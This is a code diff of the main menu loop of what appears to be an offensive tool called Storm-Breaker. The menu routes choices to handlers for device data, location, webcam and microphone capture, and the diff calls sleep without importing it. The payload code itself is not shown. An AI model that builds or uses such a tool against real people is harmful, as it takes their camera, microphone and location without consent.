@@ -1,38 +1,41 @@
+import subprocess
 from module import check
 check.dependency()
-check.check_started()
-from module import banner,handler,control
-from colorama import Fore
-#check.check_update()
-
+from module.colors import c
+from module import handler,localhost,banner
 while True:
     banner.banner()
     banner.show_menu() 
 
     try:
-        original_menu = input(Fore.RED+" ┌─["+Fore.LIGHTCYAN_EX+"STORM-BREAKER"+Fore.WHITE+"~"+Fore.LIGHTGREEN_EX+"@HOME"+Fore.RED+"""]
- └──╼ """+Fore.WHITE+"$ ")
+        User = input(c.red+" ┌─["+c.lcyan+"STORM-BREAKER"+c.re+"~"+c.lgreen+"@HOME"+c.red+"""]
+ └──╼ """+c.green+"$ ")
+        if  User == "1":
+           banner.banner()
+           handler.normal_data()
+        elif User == "2":
+           banner.banner()
+           handler.weather_info()
+        elif User == "3":
+           banner.banner()
+           handler.nearyou_info()
+        elif User == "4":
+           banner.banner()
+           handler.WebCamInfo()
+        elif User == "5":
+           banner.banner()          
+           handler.MicrophoneInfo()
+        elif User == "6":
+           banner.Devloper_information()
+        elif User == "7":        
+            localhost.kill()
+            exit(c.lred+"\n Goodbye :) ")
         
-        if  original_menu == "0":
-            handler.normal_data()
-            
-        elif original_menu == "1":
-            handler.weather_start()
-        
-        elif original_menu == "2":
-            handler.camera_temp_start()
-            
-        elif original_menu == "3":
-            handler.microphone_temp_start()
 
-        elif original_menu == "4":
-            control.kill_php_proc()
-            exit(Fore.LIGHTRED_EX+"\n Goodbye :) ")
-        
-            
-
-
-
+    except Exception as e: 
+       print(e)
+       sleep(5)
+       localhost.kill()   
     except KeyboardInterrupt:
-        control.kill_php_proc()
-        exit(Fore.CYAN+"\n Goodbye :)")
+      localhost.kill()
+      exit(c.cyan+"\n Goodbye :)")
